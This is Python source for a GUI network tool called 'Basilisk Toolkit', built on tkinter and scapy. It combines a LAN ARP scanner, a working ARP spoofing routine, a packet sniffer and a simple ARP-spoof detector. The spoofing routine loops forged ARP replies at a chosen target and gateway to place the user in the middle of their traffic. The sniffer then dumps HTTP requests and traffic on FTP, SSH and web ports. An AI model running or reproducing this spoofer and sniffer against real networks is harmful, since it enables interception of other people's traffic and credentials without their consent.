import tkinter as tk
import scapy.all as scapy
import socket
import time
import threading
from scapy.layers.http import HTTPRequest
from ctypes import windll
windll.shcore.SetProcessDpiAwareness(1)

root = tk.Tk()
root.title("Basilisk Toolkit")
#root.geometry("600x1080")
root.geometry("1920x1080")
root.configure(bg="#47494d")
root.state("zoomed")
#root.resizable(False,False)


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
user_ip = s.getsockname()[0]

flag = 0
flagg = True

for i in range(0,len(user_ip)):
    if (user_ip[i]=="."):
        flag = flag + 1
    if (flag == 3):
        slice = user_ip[:i]
        allip = slice+".1/24"
        break


def nscan():
    outp1.insert(tk.END, "Scanning....")
    outp1.update()
    arp_request = scapy.ARP(pdst=allip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=15, verbose=False)[0]

    outp1.delete("1.0",tk.END)
    outp1.insert(tk.END,"IP\t\tMAC Address\n--------------------------------------------------------")
    outp1.insert(tk.END,"\n")
    outp1.update()
    clients_list = []
    for element in answered_list:
        client_dict = {"ip":element[1].psrc, "mac":element[1].hwsrc}
        clients_list.append(client_dict)
        result = clients_list
    for client in result:
        outp1.insert(tk.END,client["ip"] + "\t\t" + client["mac"])
        outp1.insert(tk.END,"\n")
    outp1.update()

def livepscan():
    if (isinstance(int(ent1.get()),int) and int(ent1.get())>0):
        for i in range(1, int(ent1.get()) + 1):
            nscan()
            outp1.insert(tk.END, "\n")
            outp1.insert(tk.END, "Scan Count: " + str(i) + "\n")
            outp1.insert(tk.END, "Auto scanning in process.....PLEASE WAIT\n")
            outp1.update()
            time.sleep(15)
        outp1.insert(tk.END, "AUTO SCAN COMPLETE","b")
    else:
        outp1.delete("1.0",tk.END)
        outp1.insert(tk.END,"Invalid count number.Please enter a non-zero integer.","r")

def spoof():
    pakc = 0
    if (tip.get()=="" or gip.get()=="" or mac1.get()=="" or mac2.get()==""):
        outp2.delete("1.0",tk.END)
        outp2.insert(tk.END,"Please enter valid ip and mac addresses","r")
        outp2.update()

    else:
        global flagg
        flagg = True
        while flagg==True:
            tar_fool = scapy.ARP(op=2, pdst=tip.get(), hwdst=mac1.get(), psrc=gip.get())
            gate_fool = scapy.ARP(op=2, pdst=gip.get(), hwdst=mac2.get(), psrc=tip.get())
            scapy.send(tar_fool,verbose=False)
            scapy.send(gate_fool,verbose=False)
            pakc = pakc + 2
            outp2.delete("1.0",tk.END)
            outp2.insert(tk.END,"Total packets sent: "+str(pakc))
            outp2.update()
            time.sleep(4)

def endspoof():
    global flagg
    flagg=False
    outp2.insert(tk.END,"\n")
    outp2.insert(tk.END,"SESSION TERMINATED ","b")
    outp2.update()


def thread1():
    popo = threading.Thread(target=spoof)
    popo.start()


def capture():
    if (interface_name.get()==""):
        outp3.insert(tk.END,"Please enter a valid and active network interface name!!","r")
    else:
        if value_inside.get() == "Select Filter":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING....(Using Default Filter=HTTPRequest", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_http)
        if value_inside.get() == "UDP":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (UDP)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_sum, filter="udp")
        if value_inside.get() == "ARP":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (ARP)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_sum, filter="arp")
        if value_inside.get() == "TCP":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (TCP)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_any, filter="tcp")
        if value_inside.get() == "HTTPRequests":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (HTTPRequest)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_http)
        if  value_inside.get() == "Port: 80":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (Port:80)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_any, filter="port 80")
        if value_inside.get() == "Port: 443":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (Port:443)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_any, filter="port 443")
        if value_inside.get() == "Post: 22":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (Port:22)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_any, filter="port 22")
        if value_inside.get() == "Port: 21":
            outp3.delete("1.0", tk.END)
            outp3.insert(tk.END, "PACKET CAPTURE RUNNING (Port:21)", "b")
            outp3.insert(tk.END, "\n")
            scapy.sniff(iface=interface_name.get(), store=False, prn=capture_any, filter="port 21")

def capture_http(packet):
    if packet.haslayer(HTTPRequest):
        outp3.insert(tk.END,packet.show(dump=True))
        outp3.insert(tk.END,"\n")
        outp3.update()

def capture_any(packet):
    outp3.insert(tk.END, packet.show(dump=True))
    outp3.insert(tk.END, "\n")
    outp3.update()

def capture_sum(packet):
    outp3.insert(tk.END, packet.summary())
    outp3.insert(tk.END, "\n")
    outp3.update()


def arp_d():
    if (gate_wayip.get()=="" or gate_waymac.get()=="" or interface_name2.get()==""):
        out4.delete("1.0", tk.END)
        out4.insert(tk.END, "Error", "r")
    else:
        out4.insert(tk.END, "Scan initiated:SAFE")
        scapy.sniff(iface=interface_name2.get(), store=False, prn=packet_detect)


def packet_detect(pack):
    if pack.haslayer(scapy.ARP) and pack[scapy.ARP].op == 2:
        try:
            response_mac = pack[scapy.ARP].hwsrc
            if pack[scapy.ARP].psrc==gate_wayip.get() and response_mac != gate_waymac.get():
                out4.delete("1.0",tk.END)
                out4.insert(tk.END,"Detected:ALERT!","r")
        except IndexError:
            pass


def thread2():
    threading.Thread(target=capture).start()

def thread3():
    threading.Thread(target=livepscan).start()

def maint():
    threading.Thread(target=nscan).start()

def thread4():
    threading.Thread(target=arp_d).start()


main_txt = tk.Label(root, text="BASILISK TOOLKIT", font=("Arial",25,"bold"), fg="#0CCA4A",bg="#47494d")
txt1 = tk.Label(root, text="NETWORK SCANNER:", font=("Arial", 12, "bold"), fg="#C8D3D5", bg="#47494d")
but1 = tk.Button(root, text="QUCIK SCAN", font=("Arial",10,"bold"), bg="#A4B8C4",command=maint)
but2 = tk.Button(root, text="AUTO SCAN", font=("Arial",10,"bold"), bg="#A4B8C4",command=thread3)
txt2 = tk.Label(root,text="ENTER SCAN COUNT:", font=("Arial",8,"bold"), bg="#47494d")
ent1 = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",8,"bold"))
u_iptxt = tk.Label(root, text="YOUR LOCAL IP: "+s.getsockname()[0], font=("Arial",10,"bold"),bg="#47494d")
outtxt1 = tk.Label(root, text="DISCOVERED DEVICES:", font=("Arial",18,"bold"),bg="#47494d")
outp1 = tk.Text(root,font=("Arial",10,"bold"),bg="#27292b",fg="#0CCA4A" )
txt3 = tk.Label(root, text="ARP SPOOFING:", font=("Arial", 12, "bold"), fg="#C8D3D5", bg="#47494d")
txt4 = tk.Label(root, text="Target IP:",font=("Arial",8,"bold"),bg="#47494d")
tip = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",8,"bold"))
txt6 = tk.Label(root, text="Target MAC:",font=("Arial",8,"bold"),bg="#47494d")
mac1 = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",8,"bold"))

txt5 = tk.Label(root, text="Gateway IP:",font=("Arial",8,"bold"),bg="#47494d")
gip = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",8,"bold"))
txt7 = tk.Label(root, text="Gateway MAC:",font=("Arial",8,"bold"),bg="#47494d")
mac2 = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",8,"bold"))
but3 = tk.Button(root, text="BEGIN SPOOF", font=("Arial",10,"bold"), bg="#A4B8C4",command=thread1)
txt8 = tk.Label(root, text="SESSION STATUS:", font=("Arial",15,"bold"),bg="#47494d")
outp2 =tk.Text(root,font=("Arial",10,"bold"),bg="#27292b",fg="#0CCA4A" )
but4 = tk.Button(root, text="END SPOOF", font=("Arial",10,"bold"), bg="#A4B8C4",command=endspoof)
txt9 = tk.Label(root,text="PACKET SNIFFER:", font=("Arial", 12, "bold"), fg="#C8D3D5", bg="#47494d")
txt10 = tk.Label(root, text="SNIFFED DATA:", font=("Arial",18,"bold"),bg="#47494d")
outp3 = tk.Text(root,font=("Arial",10,"bold"),bg="#27292b",fg="#0CCA4A" )
but8 = tk.Button(root, text="START CAPTURING", font=("Arial",10,"bold"), bg="#A4B8C4",command=thread2)
interface_name = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",10,"bold"))
txt12 = tk.Label(root, text="Network interface name:",font=("Arial",8,"bold"),bg="#47494d")
txt13 = tk.Label(root, text="ARP SPOOF DETECTION:",font=("Arial", 12, "bold"), fg="#C8D3D5", bg="#47494d")
interface_name2 = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",10,"bold"))
txt14 = tk.Label(root, text="Network interface name:",font=("Arial",8,"bold"),bg="#47494d")
but9 = tk.Button(root, text="START SCAN", font=("Arial",10,"bold"), bg="#A4B8C4",command=thread4)
gate_waymac = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",10,"bold"))
txt15 = tk.Label(root, text="Status:",font=("Arial",8,"bold"),bg="#47494d")
txt16 = tk.Label(root, text="Gateway MAC:",font=("Arial",8,"bold"),bg="#47494d")
out4 = tk.Text(root,bg="#27292b",fg="#0CCA4A",font=("Arial",10,"bold"))
txt17 = tk.Label(root, text="Gateway IP:",font=("Arial",8,"bold"),bg="#47494d")
gate_wayip = tk.Entry(root,bg="#27292b",fg="#0CCA4A",font=("Arial",10,"bold"))

#optionlist
options_list = ["HTTPRequests", "UDP", "ARP", "TCP", "Port: 80", "Port: 443", "Port: 21", "Port: 22"]
value_inside = tk.StringVar(root)
value_inside.set("Select Filter")
question_menu = tk.OptionMenu(root, value_inside, *options_list)
question_menu.configure(bg="#A4B8C4",highlightthickness=0,font=("Arial",8,"bold"))


outp1.configure(height=16)
outp1.tag_config("b", foreground="#3d34eb")
outp1.tag_config("r", foreground="red")

outp2.configure(height=2)
outp2.tag_config("r",foreground="red")
outp2.tag_config("b", foreground="#3d34eb")

outp3.configure(width=65,height=42)
outp3.tag_config("r",foreground="red")
outp3.tag_config("b", foreground="#3d34eb")

interface_name.configure(width=25)

out4.tag_config("r", foreground="red")
out4.configure(height=1, width=20)


main_txt.pack(padx="8",pady="8")
txt1.pack()
but1.pack(pady=10)
but2.pack()
txt2.pack()
ent1.pack(pady=1)
u_iptxt.pack()
outtxt1.pack()
outp1.pack()
txt3.pack(pady=5)
txt4.pack()
tip.pack()
txt6.pack()
mac1.pack()
txt5.pack()
gip.pack()
txt7.pack()
mac2.pack()
but3.pack(pady=5)
but4.pack(pady=3)
txt8.pack()
outp2.pack()

#custom placements begins

#sniffer
txt9.place(x=187,y=64)
txt10.place(x=165,y=90)
txt12.place(x=10,y=938)
interface_name.place(x=10,y=960)
question_menu.place(x=425,y=950.5)
but8.place(x=250,y=950)
outp3.place(x=0, y=125)

#detection
txt13.place(x=1500, y=64)
txt14.place(x=1545, y=90)
interface_name2.place(x=1533,y=112)
txt16.place(x=1572, y=135)
gate_waymac.place(x=1533,y=157)
txt17.place(x=1580, y=180)
gate_wayip.place(x=1533, y=200)
but9.place(x=1566, y=229)
txt15.place(x=1600,y=270)
out4.place(x=1533,y=295)



root.mainloop()
